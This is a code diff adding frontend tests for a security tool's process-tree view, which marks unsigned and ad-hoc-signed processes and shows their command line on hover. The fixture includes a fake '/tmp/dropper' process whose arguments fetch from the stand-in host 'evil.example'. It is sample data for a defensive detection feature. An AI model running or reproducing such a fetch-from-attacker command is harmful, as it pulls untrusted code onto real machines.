@@ -256,3 +256,66 @@ describe("ProcessTreeView process-backed alert", () => {
     expect(await screen.findByRole("button", { name: /full host tree/i })).toBeInTheDocument();
   });
 });
+
+// Graph-level conviction evidence (issue #580): the ring class and hover tooltip wiring over a rendered D3 tree. The verdict
+// derivation itself is unit-tested in signing.test.ts; these pin the renderTree integration.
+describe("ProcessTreeView conviction evidence", () => {
+  const execd = (id: number, pid: number, ppid: number, path: string, extra: Partial<ProcessNode> = {}): ProcessNode => ({
+    ...process(id, pid, ppid, path),
+    exec_time_ns: 2,
+    ...extra,
+  });
+  const signingForest: ProcessNode[] = [
+    {
+      ...execd(10, 100, 1, "/bin/zsh", {
+        code_signing: { team_id: "", signing_id: "com.apple.zsh", flags: 1, is_platform_binary: true },
+      }),
+      children: [
+        execd(11, 200, 100, "/tmp/dropper", { args: ["dropper", "--fetch", "http://evil.example/x"] }),
+        execd(12, 300, 100, "/tmp/local-build", {
+          code_signing: { team_id: "", signing_id: "local", flags: 3, is_platform_binary: false },
+        }),
+      ],
+    },
+  ];
+
+  beforeEach(() => {
+    vi.spyOn(api, "getProcessTree").mockResolvedValue({ roots: signingForest });
+  });
+
+  // spec:web-ui/process-node-conviction-evidence/unsigned-and-ad-hoc-nodes-are-marked-in-the-graph
+  it("applies the evidence class to unsigned and ad-hoc nodes only", async () => {
+    const { container } = renderTree("");
+    await waitFor(() => {
+      expect(container.querySelectorAll("g.node").length).toBe(3);
+    });
+    const marked = [...container.querySelectorAll("g.node--evidence")].map(
+      (g) => g.querySelector(".node__label")?.textContent ?? "",
+    );
+    expect(marked).toHaveLength(2);
+    expect(marked.join(" ")).toContain("dropper");
+    expect(marked.join(" ")).toContain("local-build");
+  });
+
+  // spec:web-ui/process-node-conviction-evidence/hovering-a-node-shows-the-command-line-and-verdict
+  it("shows the evidence tooltip on hover and clears it on leave", async () => {
+    const { container } = renderTree("");
+    await waitFor(() => {
+      expect(container.querySelectorAll("g.node--evidence").length).toBe(2);
+    });
+    const unsignedNode = [...container.querySelectorAll("g.node--evidence")].find((g) =>
+      (g.querySelector(".node__label")?.textContent ?? "").includes("dropper"),
+    );
+    expect(unsignedNode).toBeDefined();
+
+    fireEvent.mouseEnter(unsignedNode as Element, { clientX: 120, clientY: 140 });
+    const tooltip = await screen.findByRole("tooltip");
+    expect(tooltip).toHaveTextContent("dropper --fetch http://evil.example/x");
+    expect(tooltip).toHaveTextContent("unsigned");
+
+    fireEvent.mouseLeave(unsignedNode as Element);
+    await waitFor(() => {
+      expect(screen.queryByRole("tooltip")).not.toBeInTheDocument();
+    });
+  });
+});
